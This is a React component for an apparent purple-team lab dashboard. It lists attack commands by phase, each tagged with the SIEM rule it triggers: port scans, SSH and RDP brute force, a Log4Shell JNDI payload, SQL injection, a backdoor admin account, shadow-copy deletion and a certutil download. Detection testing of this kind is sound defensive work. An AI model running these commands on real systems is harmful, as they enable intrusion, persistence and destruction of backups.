import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Terminal, AlertTriangle } from 'lucide-react';

const PHASES = [
  { id:'recon', label:'Phase 1 — Reconnaissance', color:'#6b7fa3',
    commands:[
      { cmd:'sudo nmap -sS -T4 -p 1-65535 192.168.56.10', desc:'SYN scan SIEM server' },
      { cmd:'sudo nmap -sV -sC -p 22,80,443,9000,9200,55000 192.168.56.0/24', desc:'Service detection' },
      { cmd:'sudo arp-scan --interface=eth1 192.168.56.0/24', desc:'Host discovery' },
    ]},
  { id:'cred', label:'Phase 2 — Credential Attacks', color:'#ff8c00',
    commands:[
      { cmd:'hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.56.40', desc:'SSH brute force (triggers rule 100001)' },
      { cmd:'crowbar -b rdp -s 192.168.56.30/32 -u administrator -C passwords.txt', desc:'RDP brute force (triggers rule 100003)' },
    ]},
  { id:'exploit', label:'Phase 3 — Exploitation', color:'#ff2d6d',
    commands:[
      { cmd:"curl -A '${jndi:ldap://192.168.56.20:1389/a}' http://192.168.56.40/", desc:'Log4Shell (triggers rule 100019)' },
      { cmd:"curl -s \"http://192.168.56.40/search?q=1' UNION SELECT null,username--\"", desc:'SQLi test (triggers rule 100020)' },
    ]},
  { id:'post', label:'Phase 4 — Post-Exploitation (Windows)', color:'#7b2fff',
    commands:[
      { cmd:'net user backdoor P@ss123! /add && net localgroup administrators backdoor /add', desc:'Create admin (triggers rules 100009+100010)' },
      { cmd:'vssadmin.exe delete shadows /all /quiet', desc:'Shadow copy delete (triggers rule 100012) ⚠ TAKE SNAPSHOT FIRST' },
      { cmd:'certutil.exe -urlcache -split -f "http://192.168.56.20/test.txt" C:\\Windows\\Temp\\t.txt', desc:'Certutil LOLBin (triggers rule 100006)' },
    ]},
];

export default function AttackSimulator() {
  const [openPhase, setOpenPhase] = useState('recon');
  return (
    <motion.div key="attack-sim"
      initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }}
      exit={{ opacity:0 }} transition={{ duration:0.25 }}
    >
      <div style={{ marginBottom:8 }}>
        <h1 style={{ fontSize:22, fontWeight:700, color:'#e8f4ff', margin:0,
          display:'flex', alignItems:'center', gap:10 }}>
          <Terminal size={20} color="#00e5ff" /> Attack Simulator
        </h1>
        <div style={{ fontSize:13, color:'#3d5080', marginTop:4 }}>
          Purple team playbook · Lab network 192.168.56.0/24 only
        </div>
      </div>

      <div style={{
        display:'flex', alignItems:'center', gap:8, marginBottom:20,
        padding:'10px 14px', background:'rgba(255,214,0,0.07)',
        border:'1px solid rgba(255,214,0,0.25)', borderRadius:8,
      }}>
        <AlertTriangle size={14} color="#ffd600" />
        <span style={{ fontSize:12.5, color:'#ffd600' }}>
          Run these commands ONLY inside the isolated 192.168.56.0/24 lab network
          against VMs you own. Never test against systems without authorization.
        </span>
      </div>

      <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
        {PHASES.map(phase => (
          <div key={phase.id} className="glass-card"
            style={{ padding:0, overflow:'hidden', borderLeft:`3px solid ${phase.color}` }}>
            <div onClick={() => setOpenPhase(openPhase===phase.id ? null : phase.id)}
              style={{ padding:'14px 18px', cursor:'pointer', display:'flex',
                justifyContent:'space-between', alignItems:'center' }}>
              <span style={{ fontSize:14, fontWeight:600, color:'#e8f4ff' }}>
                {phase.label}
              </span>
              <span style={{ fontSize:12, color:'#3d5080' }}>
                {phase.commands.length} commands
              </span>
            </div>
            {openPhase === phase.id && (
              <motion.div initial={{ height:0 }} animate={{ height:'auto' }}
                style={{ overflow:'hidden' }}>
                <div style={{ padding:'0 18px 16px',
                  display:'flex', flexDirection:'column', gap:10 }}>
                  {phase.commands.map((c, i) => (
                    <div key={i}>
                      <div style={{ fontSize:11.5, color:'#6b7fa3', marginBottom:5 }}>
                        {c.desc}
                      </div>
                      <div style={{
                        fontFamily:'JetBrains Mono,monospace', fontSize:11.5,
                        color:'#00e5ff', background:'rgba(0,0,0,0.4)',
                        border:'1px solid #1a2744', borderRadius:5,
                        padding:'9px 12px', wordBreak:'break-all',
                      }}>
                        $ {c.cmd}
                      </div>
                    </div>
                  ))}
                </div>
              </motion.div>
            )}
          </div>
        ))}
      </div>
    </motion.div>
  );
}